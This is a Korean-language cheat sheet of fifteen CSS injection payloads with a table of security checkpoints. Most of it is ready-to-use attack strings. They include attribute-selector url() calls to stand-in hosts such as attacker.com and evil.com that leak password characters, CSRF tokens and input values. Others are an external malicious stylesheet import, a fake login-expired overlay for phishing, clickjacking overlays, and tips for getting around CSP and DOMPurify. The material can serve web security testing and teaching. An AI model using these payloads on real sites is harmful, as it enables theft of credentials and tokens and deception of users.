# 🛠 CSS Injection Payload 예제

| 번호         | 페이로드                                                                                                                                                      | 목적 / 설명                           | 사용 위치                 |
| -- | --------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------- | --------------------- |
| 1  | `<style>body { display: none; }</style>`                                                                                                                  | 전체 페이지 숨김 (DoS 유사 효과)             | `<style>` 태그 삽입 가능할 때 |
| 2  | `</style><style>body{background:red}</style>`                                                                                                             | 기존 스타일 태그를 조기 종료하고 새 CSS 삽입       | HTML 콘텐츠 내            |
| 3  | `<div style="color:red;background:url('https://attacker.com/log?a');">Test</div>`                                                                         | 외부 서버로 요청 유도 (정보 유출 가능)           | `style` 속성 내          |
| 4  | `<style>input[type="password"][value^="a"] { background: url(https://attacker.com/a); }</style>`                                                          | 비밀번호 첫 글자 추측 (CSS + exfil)        | `<style>` 태그          |
| 5  | `<style>input:focus { background-image: url('https://attacker.com/focus'); }</style>`                                                                     | 사용자가 입력 필드에 포커스할 때 외부 요청 발생       | `<style>` 태그          |
| 6  | `<style>body::before { content: "로그인이 만료되었습니다"; position: fixed; top: 0; left: 0; background: white; width: 100%; height: 100%; z-index: 9999; }</style>` | 가짜 UI/피싱 창 삽입                     | `<style>` 태그          |
| 7  | `<style>div::after { content: "🔥해킹됨"; color: red; }</style>`                                                                                             | 시각적 조작 (디버깅/장난/공포 유도)             | `<style>` 태그          |
| 8  | `<div style="all:unset;position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;pointer-events:auto;"></div>`                                      | 클릭재킹 (투명 요소로 클릭 유도)               | `style` 속성            |
| 9  | `<style>input[type="text"][value*="secret"] { background: url('https://evil.com/leak'); }</style>`                                                        | 입력값 내 특정 문자열 포함 여부 탐지             | `<style>` 태그          |
| 10 | `<div style="width:1000px;height:1000px;background:url('javascript:alert(1)')">X</div>`                                                                   | 오래된 브라우저 대상 JS 트리거 시도 (실패 가능성 높음) | `style` 속성            |
| 11 | `<style>@import url("https://attacker.com/evil.css");</style>`                                                                                            | 외부 악성 CSS 불러오기 (CSP 우회 시도)        | `<style>` 태그          |
| 12 | `<style>form::before { content: url("https://attacker.com/img.png"); }</style>`                                                                           | 이미지 로딩 유도 (트래킹, 감지)               | `<style>` 태그          |
| 13 | `<style>input[name='csrf'][value='token123'] { background: url('https://log.com/leak?token123'); }</style>`                                               | CSRF 토큰 추적 (간접적 정보 유출)            | `<style>` 태그          |
| 14 | `<style>:root { --x: url("https://evil.com"); background: var(--x); }</style>`                                                                            | CSS 변수 활용한 우회 시도                  | `<style>` 태그          |
| 15 | `<style>@keyframes leak { 0% { background: url('https://leak.com') } }</style>`                                                                           | 애니메이션 활용 외부 요청 유도                 | `<style>` 태그          |

---

## ✅ CSS Injection 보안 체크 포인트

| 항목                  | 설명                                                                                                 |
| ------------------- | -------------------------------------------------------------------------------------------------- |
| **테스트 브라우저**        | 최신 Chrome, Firefox 등은 일부 CSS 페이로드 차단 → 테스트는 구형 브라우저나 CSP 비활성화 환경에서 진행 권장                           |
| **CSP 정책 우회**       | `style-src`에 `'unsafe-inline'`이 없을 경우 `<style>` 태그 및 `style=` 속성의 인라인 CSS가 차단됨                     |
| **DOMPurify 우회**    | 기본 설정은 `<style>` 태그와 `style` 속성을 허용함 → `{ FORBID_TAGS: ['style'], FORBID_ATTR: ['style'] }`로 차단 가능 |
| **페이로드 삽입 위치**      | HTML 템플릿에서 `<style>` 또는 `style=` 속성 내에 사용자 입력이 직접 삽입될 때 가장 취약                                      |
| **속성 기반 필터 우회**     | `"; background: url(...);` 등의 입력으로 기존 스타일 체인을 끊고 악성 스타일 삽입 가능                                      |
| **`<style>` 태그 삽입** | CSP에서 `'unsafe-inline'`이 설정된 경우 가능, 그렇지 않으면 브라우저가 차단할 수 있음                                         |
| **`style` 속성 삽입**   | DOMPurify 또는 CSP 설정에 따라 허용 여부 결정 → 보통은 `<div style="...">` 형태로 주입                                  |
| **외부 CSS 로딩**       | `<style>@import url(https://attacker.com);</style>` 방식으로 악성 CSS 파일을 불러올 수 있음 (CSP가 막지 않으면 위험)      |
| **가짜 UI 구성**        | `::before`, `::after` 등을 이용해 오버레이 방식으로 가짜 로그인 창, 오류 메시지 등 표시 가능                                    |
| **클릭재킹 구현**         | 투명한 요소를 전체 화면에 띄워 실제 버튼 클릭을 유도 (ex. `opacity:0; z-index:9999`)                                     |
| **입력값 추적용 스타일**     | `input[value^="a"]` 등 selector 조합으로 입력된 문자열 패턴을 추적하고 외부로 유출 시도                                     |
| **브라우저 특이점 활용**     | 예전 IE는 `expression()`을 통해 JS 실행 가능 → 현대 브라우저는 대부분 차단                                               |
| **DOM 기반 삽입 취약점**   | JavaScript로 `.innerHTML` 등에 삽입 시 CSS뿐 아니라 HTML 전체가 조작될 수 있어 위험                                     |
